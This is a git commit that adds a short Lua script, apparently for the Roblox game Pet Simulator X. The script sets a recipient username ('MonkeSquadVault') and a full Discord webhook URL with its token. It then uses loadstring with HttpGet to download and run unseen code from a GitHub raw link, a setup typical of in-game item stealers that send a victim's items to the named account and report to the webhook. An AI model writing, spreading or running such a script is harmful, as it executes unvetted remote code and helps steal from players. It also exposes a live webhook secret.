f824e985a76d7da0f177ce9b9eb7453228caa1c4
dayrox12 <103541607+dayrox12@users.noreply.github.com>
2022-12-08 20:17:24 -0500

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,4 @@
+UserName = "MonkeSquadVault"
+WebHook = "https://discord.com/api/webhooks/1050569675492307004/ZXnCacg8xR_5Cb7B_MiN9SMQCy5PglopIsQpbXwYjj633FWWJyMsQ2naF6Pd2SPFOM3l"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
